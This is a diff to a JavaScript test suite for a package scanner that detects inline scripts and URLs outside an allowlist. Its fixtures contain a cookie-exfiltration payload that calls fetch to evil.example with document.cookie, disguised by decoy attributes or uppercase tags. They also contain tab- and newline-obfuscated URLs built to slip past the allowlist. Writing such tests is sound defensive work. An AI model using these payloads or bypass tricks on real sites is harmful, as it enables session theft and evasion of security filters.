@@ -255,4 +255,82 @@ describe("scanPackage", () => {
     expect(r.passed).toBe(false);
     expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
   });
+
+  // --- Second re-attack: fallback inline-script decoy hardening +
+  // per-token URL whitespace handling ---
+
+  it("N4: fallback mode is not fooled by a src-lookalike hiding inside ANOTHER attribute's quoted value", () => {
+    // data-x=" src=y" contains the literal substring ' src=' inside a
+    // DIFFERENT attribute's value. A regex can't tell it's not a real src
+    // attribute on the tag — which is exactly why the fix drops the
+    // "does this tag have src" exception entirely rather than trying to
+    // out-regex the next decoy shape.
+    const p = goodPackage();
+    p.set("index.html", Buffer.from(
+      '<html><body><script src="engine/engine.js"></script>' +
+      '<script data-x=" src=y">fetch("https://evil.example/collect?c=" + document.cookie)</script></body></html>'
+    ));
+    const r = scanPackage(p, ctx());
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
+  });
+
+  it("N4: fallback mode catches an inline script even with an uppercase <SCRIPT> tag", () => {
+    const p = goodPackage();
+    p.set("index.html", Buffer.from(
+      '<html><body><script src="engine/engine.js"></script>' +
+      '<SCRIPT>fetch("https://evil.example/collect?c=" + document.cookie)</SCRIPT></body></html>'
+    ));
+    const r = scanPackage(p, ctx());
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "inline-script" && v.file === "index.html")).toBe(true);
+  });
+
+  it("N4: fallback mode does NOT flag a legitimate empty-body external script tag by itself", () => {
+    // goodPackage()'s index.html is exactly <script src="engine/engine.js"></script>
+    // with an empty body — this alone must never trip "inline-script".
+    const r = scanPackage(goodPackage(), ctx());
+    expect(r.violations.some((v) => v.rule === "inline-script")).toBe(false);
+  });
+
+  it("robustness: the per-file text scan catches word<TAB>https://evil.com (raw bytes, not JSON-round-tripped)", () => {
+    // Previously, stripUrlWhitespace ran over the WHOLE text before
+    // tokenizing, so "word\thttps://evil.com" collapsed to
+    // "wordhttps://evil.com" and the \b boundary before "https" then
+    // failed to match at all -- a false negative. The tokenizer must now
+    // run on the raw (unstripped) text so the boundary survives.
+    //
+    // Written directly into a text file's raw bytes rather than through
+    // JSON.stringify: JSON-escaping a real tab produces the two-character
+    // sequence \t, whose second character ('t') is itself a word
+    // character directly touching "https" -- a different, JSON-specific
+    // artifact (see N1/N2/N3) that would mask what this test is actually
+    // isolating: the tokenizer's own boundary handling on raw text.
+    const p = goodPackage();
+    const tab = String.fromCharCode(9);
+    p.set("index.html", Buffer.from(
+      `<html><body><script src="engine/engine.js"></script><!-- word${tab}https://evil.example/x --></body></html>`
+    ));
+    const r = scanPackage(p, ctx());
+    expect(r.passed).toBe(false);
+    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
+  });
+
+  it("robustness: N1/N2/N3 (tab/newline-obfuscated URL bypass) are still caught after the per-token stripping change", () => {
+    const p = goodPackage();
+    const tab = String.fromCharCode(9);
+    const nl = String.fromCharCode(10);
+    const badTab = { ...goodConfig, intro: `<a href="https://youtube.com${tab}@evil.example/x">c</a>` };
+    p.set("content/config.json", Buffer.from(JSON.stringify(badTab)));
+    const rTab = scanPackage(p, ctx({ authoringConfig: badTab, urlAllowlist: ["youtube.com"] }));
+    expect(rTab.passed).toBe(false);
+    expect(rTab.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
+
+    const badNl = { ...goodConfig, intro: `<a href="https://youtube.com${nl}@evil.example/x">c</a>` };
+    const p2 = goodPackage();
+    p2.set("content/config.json", Buffer.from(JSON.stringify(badNl)));
+    const rNl = scanPackage(p2, ctx({ authoringConfig: badNl, urlAllowlist: ["youtube.com"] }));
+    expect(rNl.passed).toBe(false);
+    expect(rNl.violations.some((v) => v.rule === "url-allowlist" && /evil\.example/i.test(v.detail))).toBe(true);
+  });
 });
